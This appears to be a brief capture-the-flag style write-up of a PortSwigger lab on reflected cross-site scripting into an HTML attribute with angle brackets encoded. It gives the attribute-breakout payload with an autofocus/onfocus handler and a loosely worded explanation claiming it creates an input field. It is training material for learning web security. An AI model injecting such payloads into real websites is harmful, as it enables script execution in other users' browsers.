## Reflected XSS into attribute with angle brackets HTML-encoded

## Solution:


``"autofocus onfocus="alert()"``

This HTML code creates an input field that automatically receives focus when the page loads, and when it receives focus, it triggers a JavaScript alert dialog with an empty message. This payload will triger an alert popup

<img width="1438" alt="image" src="https://github.com/SantoshKumarP1412/PortSwigger/assets/140537888/819180f6-0101-46be-8220-392c95857a4b">
